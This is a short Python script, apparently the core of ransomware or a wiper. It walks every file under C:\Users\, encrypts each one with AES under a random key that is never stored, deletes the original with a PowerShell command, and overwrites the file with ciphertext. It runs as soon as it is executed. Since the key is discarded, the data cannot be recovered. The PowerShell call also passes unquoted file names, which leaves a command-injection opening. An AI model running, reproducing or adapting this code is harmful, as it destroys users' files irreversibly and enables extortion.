import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

key = get_random_bytes (32)

def encrypt_drive_1_files():

    path = "C:\\Users\\"
    files = []
    for r, d, f in os.walk(path):
        for file in f:
            if '.' in file:
                files.append(os.path.join(r, file))
    for f in files:
        print(f)

        try:
            with open (f, 'rb') as f_file_to_encrypt:
                        text_block = f_file_to_encrypt.read()
        except:
            continue    
        cipher = AES.new(key, AES.MODE_CBC)
        data_result = cipher.encrypt(pad(text_block, AES.block_size))

        try:
            output = f 
            os.popen(f"powershell 'remove-item "+f+"'")   
            with open(output, 'wb') as f_output:
                f_output.write(cipher.iv)
                f_output.write(data_result)
        except:
            pass

encrypt_drive_1_files()
